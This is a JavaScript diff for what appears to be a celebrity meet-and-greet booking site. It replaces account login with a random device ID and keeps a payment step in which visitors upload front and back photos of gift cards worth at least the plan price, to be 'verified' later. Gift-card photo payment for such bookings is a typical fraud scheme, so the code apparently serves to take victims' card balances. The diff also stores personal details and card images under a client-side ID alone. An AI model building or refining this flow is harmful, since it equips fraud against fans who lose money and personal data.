+const LS_KEY = 'momoa_user_key';
+
+/* ============================================================
+   USER KEY (no auth — a random device ID)
+   ============================================================ */
+function getUserKey(){
+  let k = localStorage.getItem(LS_KEY);
+  if (!k){
+    k = 'u_' + crypto.randomUUID();
+    localStorage.setItem(LS_KEY, k);
+  }
+  return k;
+}
+currentUserKey = getUserKey();
 
 /* ============================================================
    INIT
@@ -588,8 +433,8 @@ let pendingBookingId = null;
 document.getElementById('yr').textContent = new Date().getFullYear();
 loadNews();
 loadLocation();
-checkSession();
 initReveal();
+refreshNavCta();
 
 function initReveal(){
   const els = document.querySelectorAll('.reveal');
@@ -627,215 +472,144 @@ async function loadNews(){
   initReveal();
 }
 
-function escapeHtml(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
-function escapeAttr(s){return String(s).replace(/"/g,'&quot;');}
+function escapeHtml(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function escapeAttr(s){return String(s==null?'':s).replace(/"/g,'&quot;');}
 
 /* ============================================================
-   MODALS
+   FLOW
    ============================================================ */
-function openModal(id){ document.getElementById(id).classList.add('on'); }
-function closeModal(id){ document.getElementById(id).classList.remove('on'); }
-
 function openApply(plan, price){
   currentPlan = { name: plan, price };
-  document.getElementById('planName').textContent = plan === 'legend' ? 'The Legend' : 'The Standard';
-  document.getElementById('planInput').value = plan;
-  document.getElementById('applyStep1').style.display = 'block';
-  document.getElementById('applyStep2').style.display = 'none';
-  openModal('applyModal');
+  const label = (plan === 'legend' ? 'The Legend' : 'The Standard') + ' — $' + price;
+  document.getElementById('planTag').textContent = label;
+  document.getElementById('giftPlanTag').textContent = label;
+  document.getElementById('gcValue').value = price;
+  document.getElementById('gcValue').min = price;
+  showStep('details');
+  document.getElementById('flowModal').classList.add('on');
+}
+
+function showStep(step){
+  document.getElementById('stepDetails').style.display = step === 'details' ? 'block' : 'none';
+  document.getElementById('stepGift').style.display    = step === 'gift'    ? 'block' : 'none';
+  document.getElementById('stepDone').style.display    = step === 'done'    ? 'block' : 'none';
+  document.getElementById('dot1').classList.toggle('on', step === 'details' || step === 'gift' || step === 'done');
+  document.getElementById('dot2').classList.toggle('on', step === 'gift' || step === 'done');
+}
+
+function closeFlow(){
+  document.getElementById('flowModal').classList.remove('on');
+  refreshNavCta();
 }
 
 /* ============================================================
-   APPLY FLOW
+   STEP 1 — SAVE BOOKING
    ============================================================ */
-document.getElementById('applyForm').addEventListener('submit', async (e) => {
+document.getElementById('detailsForm').addEventListener('submit', async (e) => {
   e.preventDefault();
-  const fd = new FormData(e.target);
-  const payload = Object.fromEntries(fd.entries());
-  payload.plan = currentPlan.name;
+  const btn = document.getElementById('detailsBtn');
+  btn.disabled = true; btn.textContent = 'Saving…';
 
-  const { data: { session } } = await sb.auth.getSession();
-  if (!session){
-    window._pendingApplication = payload;
-    document.getElementById('applyStep1').style.display = 'none';
-    document.getElementById('applyStep2').style.display = 'block';
-    document.getElementById('giftCardForm').style.display = 'none';
-    document.getElementById('payMessage').textContent = 'Create an account or log in to continue to gift card upload.';
-    openModal('authModal');
-    return;
-  }
-  await createBookingAndShowGiftUpload(payload, session.user);
+  const fd = new FormData(e.target);
+  const data = Object.fromEntries(fd.entries());
+  data.user_key = currentUserKey;
+  data.plan = currentPlan.name;
+  data.status = 'pending_payment';
+
+  const { data: row, error } = await sb.from('bookings').insert(data).select().single();
+  btn.disabled = false; btn.textContent = 'Continue';
+
+  if (error){ toast('Could not save: ' + error.message, true); return; }
+
+  pendingBookingId = row.id;
+  showStep('gift');
 });
 
-async function createBookingAndShowGiftUpload(payload, user){
-  const { data: existing } = await sb.from('bookings')
-    .select('id').eq('user_id', user.id).eq('plan', payload.plan)
-    .in('status', ['pending_payment','pending_verification','paid']).maybeSingle();
-
-  let bookingId;
-  if (existing) {
-    bookingId = existing.id;
-    await sb.from('bookings').update({
-      full_name: payload.full_name, email: payload.email,
-      phone: payload.phone, state: payload.state, notes: payload.notes || null
-    }).eq('id', bookingId);
-  } else {
-    const { data, error } = await sb.from('bookings').insert({
-      user_id: user.id, plan: payload.plan,
-      full_name: payload.full_name, email: payload.email,
-      phone: payload.phone, state: payload.state,
-      notes: payload.notes || null, status: 'pending_payment'
-    }).select().single();
-    if (error){ toast('Could not save booking: ' + error.message); return; }
-    bookingId = data.id;
-  }
-
-  pendingBookingId = bookingId;
-
-  await sb.from('profiles').upsert({
-    id: user.id, full_name: payload.full_name, email: payload.email,
-    phone: payload.phone, state: payload.state, plan: payload.plan
-  });
-
-  document.getElementById('applyStep1').style.display = 'none';
-  document.getElementById('applyStep2').style.display = 'block';
-  document.getElementById('giftCardForm').style.display = 'grid';
-  document.getElementById('payMessage').textContent = `Upload a gift card worth at least $${currentPlan.price} to secure your seat.`;
-  document.getElementById('giftCardValue').value = currentPlan.price;
-}
-
 /* ============================================================
-   GIFT CARD UPLOAD
+   STEP 2 — UPLOAD GIFT CARD
    ============================================================ */
-document.getElementById('giftCardForm').addEventListener('submit', async (e) => {
+document.getElementById('giftForm').addEventListener('submit', async (e) => {
   e.preventDefault();
-  const frontFile = document.getElementById('giftCardFront').files[0];
-  const backFile = document.getElementById('giftCardBack').files[0];
-  const value = parseFloat(document.getElementById('giftCardValue').value);
-  const type = document.getElementById('giftCardType').value;
+  const front = document.getElementById('gcFront').files[0];
+  const back  = document.getElementById('gcBack').files[0];
+  const value = parseFloat(document.getElementById('gcValue').value);
+  const type  = document.getElementById('gcType').value;
 
-  if (!frontFile) { toast('Please upload the front of the gift card.'); return; }
-  if (!value || value < currentPlan.price) { toast(`Gift card value must be at least $${currentPlan.price}.`); return; }
-  if (!type) { toast('Please select the gift card type.'); return; }
+  if (!front){ toast('Please upload the front of the gift card.', true); return; }
+  if (!value || value < currentPlan.price){ toast('Value must be at least $' + currentPlan.price, true); return; }
+  if (!type){ toast('Please select the card type.', true); return; }
+  if (!pendingBookingId){ toast('Something went wrong. Please refresh and try again.', true); return; }
 
-  const { data: { session } } = await sb.auth.getSession();
-  if (!session) { toast('Please log in.'); return; }
-
-  const btn = document.getElementById('uploadBtn');
-  btn.disabled = true;
-  btn.textContent = 'Uploading…';
+  const btn = document.getElementById('giftBtn');
+  btn.disabled = true; btn.textContent = 'Uploading…';
 
   try {
-    const frontExt = frontFile.name.split('.').pop();
-    const frontPath = `${session.user.id}/${pendingBookingId}/front-${Date.now()}.${frontExt}`;
-    const { error: frontErr } = await sb.storage.from('gift-cards').upload(frontPath, frontFile);
-    if (frontErr) throw frontErr;
+    const frontExt = front.name.split('.').pop();
+    const frontPath = `${currentUserKey}/${pendingBookingId}/front-${Date.now()}.${frontExt}`;
+    const { error: fe } = await sb.storage.from('gift-cards').upload(frontPath, front);
+    if (fe) throw fe;
 
     let backPath = null;
-    if (backFile) {
-      const backExt = backFile.name.split('.').pop();
-      backPath = `${session.user.id}/${pendingBookingId}/back-${Date.now()}.${backExt}`;
-      const { error: backErr } = await sb.storage.from('gift-cards').upload(backPath, backFile);
-      if (backErr) throw backErr;
+    if (back){
+      const backExt = back.name.split('.').pop();
+      backPath = `${currentUserKey}/${pendingBookingId}/back-${Date.now()}.${backExt}`;
+      const { error: be } = await sb.storage.from('gift-cards').upload(backPath, back);
+      if (be) throw be;
     }
 
-    const { error: uploadErr } = await sb.from('uploads').insert({
+    const { error: ue } = await sb.from('uploads').insert({
       booking_id: pendingBookingId,
-      user_id: session.user.id,
+      user_key: currentUserKey,
       front_path: frontPath,
       back_path: backPath,
       gift_card_value: value,
       gift_card_type: type,
       status: 'pending_verification'
     });
-    if (uploadErr) throw uploadErr;
+    if (ue) throw ue;
 
     await sb.from('bookings').update({ status: 'pending_verification' }).eq('id', pendingBookingId);
 
-    toast('Gift card submitted. We\'ll verify within 24 hours.');
-    closeModal('applyModal');
-    document.getElementById('giftCardForm').reset();
-    btn.disabled = false;
-    btn.textContent = 'Submit Gift Card';
-    checkSession();
+    showStep('done');
+    btn.disabled = false; btn.textContent = 'Submit Gift Card';
 
   } catch (err) {
-    toast('Upload failed: ' + (err.message || 'Unknown error'));
-    btn.disabled = false;
-    btn.textContent = 'Submit Gift Card';
+    toast('Upload failed: ' + (err.message || 'Unknown error'), true);
+    btn.disabled = false; btn.textContent = 'Submit Gift Card';
   }
 });
 
 /* ============================================================
-   AUTH
+   MY BOOKING
    ============================================================ */
-let authMode = 'signup';
-document.getElementById('authSwitch').addEventListener('click', (e) => {
-  e.preventDefault();
-  authMode = authMode === 'signup' ? 'login' : 'signup';
-  document.getElementById('authTitle').textContent = authMode === 'signup' ? 'Create your account' : 'Welcome back';
-  document.getElementById('authSubmit').textContent = authMode === 'signup' ? 'Sign Up & Continue' : 'Log In & Continue';
-  document.getElementById('authSwitchText').textContent = authMode === 'signup' ? 'Already have an account?' : 'Need an account?';
-  document.getElementById('authSwitch').textContent = authMode === 'signup' ? 'Log in' : 'Sign up';
-  document.getElementById('nameField').style.display = authMode === 'signup' ? 'flex' : 'none';
-});
-
-document.getElementById('authForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const email = document.getElementById('authEmail').value.trim();
-  const pass = document.getElementById('authPass').value;
-  const name = document.getElementById('authName').value.trim();
-
-  let result;
-  if (authMode === 'signup'){
-    result = await sb.auth.signUp({ email, password: pass, options: { data: { full_name: name } } });
-  } else {
-    result = await sb.auth.signInWithPassword({ email, password: pass });
-  }
-  if (result.error){ toast(result.error.message); return; }
-
-  const user = result.data.user;
-  if (!user){ toast('Check your email to confirm, then log in.'); return; }
-
-  if (window._pendingApplication){
-    const payload = window._pendingApplication;
-    window._pendingApplication = null;
-    closeModal('authModal');
-    await createBookingAndShowGiftUpload(payload, user);
-    openModal('applyModal');
-    return;
-  }
-  closeModal('authModal');
-  toast('Signed in.');
-  checkSession();
-});
-
-async function checkSession(){
-  const { data: { session } } = await sb.auth.getSession();
+function refreshNavCta(){
   const cta = document.getElementById('navCta');
-  if (session){
-    cta.textContent = 'My Booking';
-    cta.onclick = (e) => { e.preventDefault(); openAccount(); };
-    cta.href = '#';
-  } else {
-    cta.textContent = 'Reserve';
-    cta.href = '#meet';
-    cta.onclick = null;
-  }
+  // check if this device has any booking
+  sb.from('bookings').select('id').eq('user_key', currentUserKey).limit(1).then(({ data }) => {
+    if (data && data.length){
+      cta.textContent = 'My Booking';
+      cta.onclick = (e) => { e.preventDefault(); openAccount(); };
+      cta.href = '#';
+    } else {
+      cta.textContent = 'Reserve';
+      cta.href = '#meet';
+      cta.onclick = null;
+    }
+  });
 }
 
 async function openAccount(){
-  openModal('accountModal');
-  const { data: { session } } = await sb.auth.getSession();
-  if (!session) return;
+  document.getElementById('accountModal').classList.add('on');
+  const body = document.getElementById('accountBody');
+  body.innerHTML = 'Loading…';
 
   const { data: bookings } = await sb.from('bookings').select('*')
-    .eq('user_id', session.user.id)
+    .eq('user_key', currentUserKey)
     .order('created_at', { ascending: false }).limit(1);
 
   const b = bookings?.[0];
   if (!b){
-    document.getElementById('accountBody').innerHTML = '<p>No booking yet.</p>';
+    body.innerHTML = '<p>No booking found on this device yet.</p>';
     return;
   }
 
@@ -844,22 +618,25 @@ async function openAccount(){
   let statusHtml = '';
   if (b.status === 'paid') statusHtml = '<span class="badge" style="background:rgba(80,180,120,.12);color:#6ec48f">Confirmed</span>';
   else if (b.status === 'pending_verification') statusHtml = '<span class="badge">Under review</span>';
+  else if (b.status === 'rejected') statusHtml = '<span class="badge" style="background:rgba(220,80,80,.1);color:#e07a7a">Rejected</span>';
   else statusHtml = '<span class="badge" style="background:rgba(220,80,80,.1);color:#e07a7a">Pending</span>';
 
   let uploadsHtml = '';
-  if (uploads && uploads.length) {
+  if (uploads && uploads.length){
+    const u = uploads[0];
     uploadsHtml = `
       <hr style="border:none;border-top:1px solid var(--line);margin:28px 0"/>
       <p style="font-size:11px;letter-spacing:.24em;text-transform:uppercase;color:var(--gold);margin-bottom:12px">Gift Card</p>
-      <p style="font-size:14px;margin-bottom:6px"><strong style="font-weight:400;color:var(--muted)">Type:</strong> ${escapeHtml(uploads[0].gift_card_type)}</p>
-      <p style="font-size:14px;margin-bottom:6px"><strong style="font-weight:400;color:var(--muted)">Value:</strong> $${uploads[0].gift_card_value}</p>
-      <p style="font-size:14px"><strong style="font-weight:400;color:var(--muted)">Status:</strong> ${uploads[0].status === 'verified' ? 'Verified' : 'Pending review'}</p>
+      <p style="font-size:14px;margin-bottom:6px"><strong style="font-weight:400;color:var(--muted)">Type:</strong> ${escapeHtml(u.gift_card_type)}</p>
+      <p style="font-size:14px;margin-bottom:6px"><strong style="font-weight:400;color:var(--muted)">Value:</strong> $${u.gift_card_value}</p>
+      <p style="font-size:14px"><strong style="font-weight:400;color:var(--muted)">Status:</strong> ${u.status === 'verified' ? 'Verified' : u.status === 'rejected' ? 'Rejected' : 'Pending review'}</p>
     `;
   }
 
-  document.getElementById('accountBody').innerHTML = `
-    <p style="margin-bottom:14px"><strong style="font-weight:400;color:var(--muted);font-size:12px;letter-spacing:.2em;text-transform:uppercase">Plan</strong><br/><span style="font-family:'Cormorant Garamond',serif;font-size:22px">${escapeHtml(b.plan === 'legend' ? 'The Legend' : 'The Standard')}</span></p>
+  body.innerHTML = `
+    <p style="margin-bottom:14px"><strong style="font-weight:400;color:var(--muted);font-size:12px;letter-spacing:.2em;text-transform:uppercase">Plan</strong><br/><span style="font-family:'Cormorant Garamond',serif;font-size:22px">${b.plan === 'legend' ? 'The Legend' : 'The Standard'}</span></p>
     <p style="margin-bottom:14px"><strong style="font-weight:400;color:var(--muted);font-size:12px;letter-spacing:.2em;text-transform:uppercase">Status</strong><br/>${statusHtml}</p>
+    <p style="margin-bottom:14px"><strong style="font-weight:400;color:var(--muted);font-size:12px;letter-spacing:.2em;text-transform:uppercase">Name</strong><br/>${escapeHtml(b.full_name || '')}</p>
     <p style="margin-bottom:14px"><strong style="font-weight:400;color:var(--muted);font-size:12px;letter-spacing:.2em;text-transform:uppercase">State</strong><br/>${escapeHtml(b.state || '')}</p>
     ${b.status === 'paid'
       ? `<p style="margin-top:24px;color:var(--gold);font-size:14px">Payment confirmed. Bring ID matching your booking name to the event.</p>`
@@ -868,7 +645,6 @@ async function openAccount(){
     <hr style="border:none;border-top:1px solid var(--line);margin:28px 0"/>
     <p style="font-size:11px;letter-spacing:.24em;text-transform:uppercase;color:var(--gold);margin-bottom:8px">Booking Reference</p>
     <p style="font-family:ui-monospace,monospace;font-size:12px;color:var(--muted-2);word-break:break-all">${b.id}</p>
-    <button class="btn btn-ghost" style="width:100%;margin-top:28px" onclick="sb.auth.signOut().then(()=>location.reload())">Log Out</button>
   `;
 }
 
@@ -879,7 +655,7 @@ document.getElementById('newsletterForm').addEventListener('submit', async (e) =
   e.preventDefault();
   const email = document.getElementById('newsletterEmail').value.trim();
   const { error } = await sb.from('newsletter').insert({ email });
-  if (error && !error.message.toLowerCase().includes('duplicate')){ toast(error.message); return; }
+  if (error && !error.message.toLowerCase().includes('duplicate')){ toast(error.message, true); return; }
   toast('You\'re on the list.');
   e.target.reset();
 });
@@ -887,9 +663,10 @@ document.getElementById('newsletterForm').addEventListener('submit', async (e) =
 /* ============================================================
    UTIL
    ============================================================ */
-function toast(msg){
+function toast(msg, err){
   const t = document.getElementById('toast');
   t.textContent = msg;
+  t.classList.toggle('err', !!err);
   t.classList.add('on');
   setTimeout(()=>t.classList.remove('on'), 3600);
 }
